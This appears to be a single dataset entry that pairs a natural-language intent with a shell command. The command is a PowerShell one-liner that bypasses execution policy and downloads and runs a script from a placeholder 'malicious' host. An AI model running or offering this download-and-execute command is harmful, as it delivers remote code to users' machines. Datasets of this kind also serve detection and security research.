# Natural language intent:
# Execute a command from a remote malicious website using PowerShell

powershell -exec bypass -c "IEX ((New-Object Net.WebClient).DownloadString('http://malicious-url.com/malicious-script.ps1'))"
